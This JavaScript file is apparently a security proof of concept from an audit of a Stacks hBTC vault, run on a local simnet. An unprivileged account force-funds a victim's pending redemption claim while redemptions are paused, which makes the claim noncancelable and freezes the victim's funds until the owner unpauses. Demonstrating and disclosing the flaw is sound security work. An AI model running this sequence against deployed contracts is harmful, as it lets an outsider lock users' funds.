import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const simnet = await initSimnet('tests/security/pause-force-fund/Clarinet.toml');
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const guardian = accounts.get('wallet_1');
const victim = accounts.get('wallet_2');
const attacker = accounts.get('wallet_3');
if (!deployer || !guardian || !victim || !attacker) throw new Error('missing accounts');

const BASE = 100_000_000n;
const PROD_SBTC_TOKEN = 'SM3VDXK3WZZSA84XXFKAFAF15NNZX32CTSG82JFQ4.sbtc-token';
const c = n => `${deployer}.${n}`;
const text = r => cvToString(r.result);
const pub = (n, fn, args, sender) => simnet.callPublicFn(c(n), fn, args, sender);
const ro = (n, fn, args = [], sender = deployer) => simnet.callReadOnlyFn(c(n), fn, args, sender);

function expectResult(label, r, wanted) {
  const got = text(r);
  console.log(`${label}: ${got}`);
  assert.equal(got, wanted, `${label}: expected ${wanted}, got ${got}`);
}
function uintFrom(r) {
  const got = text(r);
  const m = got.match(/(?:\(ok )?u(\d+)\)?/);
  if (!m) throw new Error(`not uint: ${got}`);
  return BigInt(m[1]);
}
function hbtc(who) {
  return uintFrom(ro('token-hbtc', 'get-balance', [Cl.principal(who)], who));
}

console.log('=== setup exact-current hBTC roles/assets ===');
const state = c('state');
const vault = c('vault');
const reserve = c('reserve');
for (const address of [state, vault, reserve]) {
  expectResult(`request protocol role ${address}`, pub('hq-hbtc', 'request-protocol-update', [Cl.principal(address), Cl.bool(true)], deployer), '(ok true)');
}
expectResult('request guardian role', pub('hq-hbtc', 'request-guardian-update', [Cl.principal(guardian), Cl.bool(true)], deployer), '(ok true)');
expectResult('request sBTC asset', pub('state', 'request-asset-add', [Cl.principal(PROD_SBTC_TOKEN), Cl.buffer(new Uint8Array(32)), Cl.uint(8), Cl.uint(500), Cl.bool(false)], deployer), '(ok true)');
simnet.mineEmptyBlocks(200);
for (const address of [state, vault, reserve]) {
  expectResult(`confirm protocol role ${address}`, pub('hq-hbtc', 'confirm-protocol-request', [Cl.principal(address)], deployer), '(ok true)');
}
expectResult('confirm guardian role', pub('hq-hbtc', 'confirm-guardian-request', [Cl.principal(guardian)], deployer), '(ok true)');
expectResult('confirm sBTC asset', pub('state', 'confirm-asset-request', [Cl.principal(PROD_SBTC_TOKEN)], deployer), '(ok true)');
expectResult('set deposit cap', pub('state', 'set-deposit-cap', [Cl.uint(2n * BASE)], deployer), '(ok true)');
expectResult('attacker is not manager', ro('hq-hbtc', 'get-manager', [Cl.principal(attacker)]), 'false');
expectResult('attacker is not guardian', ro('hq-hbtc', 'get-guardian', [Cl.principal(attacker)]), 'false');

const mint = simnet.callPrivateFn(
  PROD_SBTC_TOKEN,
  'protocol-mint-many-iter',
  [Cl.tuple({ amount: Cl.uint(BASE), recipient: Cl.principal(victim) })],
  deployer,
);
expectResult('fund victim with 1.00 sBTC', mint, '(ok true)');

console.log('=== CONTROL: pause alone leaves mature standard claim cancelable ===');
expectResult('victim deposit', pub('vault', 'deposit', [Cl.uint(BASE), Cl.none()], victim), '(ok u100000000)');
expectResult('victim request claim #1', pub('vault', 'request-redeem', [Cl.uint(BASE), Cl.bool(false)], victim), '(ok u1)');
simnet.mineEmptyBlocks(500);
expectResult('guardian disable-redeem', pub('state', 'disable-redeem', [], guardian), '(ok true)');
expectResult('victim cancel #1', pub('vault', 'cancel-redeem', [Cl.uint(1)], victim), '(ok u100000000)');
assert.equal(hbtc(victim), BASE);

console.log('=== ATTACK: unrelated caller force-funds under same pause ===');
expectResult('owner re-enable', pub('state', 'set-redeem-enabled', [Cl.bool(true)], deployer), '(ok true)');
expectResult('victim request claim #2', pub('vault', 'request-redeem', [Cl.uint(BASE), Cl.bool(false)], victim), '(ok u2)');
simnet.mineEmptyBlocks(500);
expectResult('guardian disable-redeem again', pub('state', 'disable-redeem', [], guardian), '(ok true)');
expectResult('attacker force-fund #2', pub('vault', 'fund-claim', [Cl.uint(2)], attacker), '(ok u100000000)');
assert.equal(hbtc(victim), 0n);
expectResult('victim cancel after force-funding', pub('vault', 'cancel-redeem', [Cl.uint(2)], victim), '(err u103005)');
expectResult('victim redeem while paused', pub('vault', 'redeem', [Cl.uint(2)], victim), '(err u102006)');

console.log('=== RECOVERY: owner unpause is required ===');
expectResult('owner re-enable redemption', pub('state', 'set-redeem-enabled', [Cl.bool(true)], deployer), '(ok true)');
expectResult('victim final redeem', pub('vault', 'redeem', [Cl.uint(2)], victim), '(ok u100000000)');

console.log('POC_PASS: an unprivileged non-manager/non-guardian can convert a cancelable mature standard claim into a funded noncancelable claim while redeem is disabled, freezing the victim until owner unpauses.');
